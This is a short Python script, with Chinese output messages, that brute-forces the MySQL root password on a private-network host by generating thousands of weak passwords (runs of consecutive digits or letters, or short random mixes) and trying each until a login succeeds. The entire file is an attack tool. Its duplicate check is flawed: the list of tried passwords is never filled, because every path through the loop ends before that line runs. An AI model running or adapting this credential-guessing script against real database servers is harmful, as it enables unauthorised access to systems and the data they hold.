#coding=utf8
import random,string,MySQLdb
def get_num():
    return random.randint(0,9)
def get_char():
    return random.choice(tuple(string.lowercase))
def choose_any():
    return [str(get_num()),get_char()]
def get_weak_num():
    weak_num=[]
    initial_num=get_num()
    for i in range(get_num()):
        weak_num.append(str(initial_num+i))
        if initial_num +i ==9:
            break;
    return weak_num
def get_weak_character():
    weak_character=[]
    initial_character=get_char()
    for i in range(get_num()):
        weak_character.append(chr(ord(initial_character)+i))
        if chr(ord(initial_character)+i) == 'z':
            break
    return weak_character
def get_weak_num_character():
    return [random.choice(choose_any()) for num in range(get_num())]
password_exist=[]
for i in range(10000):
    choice = [get_weak_num(), get_weak_character(), get_weak_num_character()]
    password=''.join(random.choice(choice))
    print ("第" + str(i) + "次密码为：", password)
    if password in password_exist:
        continue
    else:
        try:
            MySQLdb.connect('192.168.244.145', 'root', password)
            print ('The password for MySQL is:', password)
            break
        except:
            continue
        password_exist.append(password)
if i == 9999:
    print ('The password is not so weak~')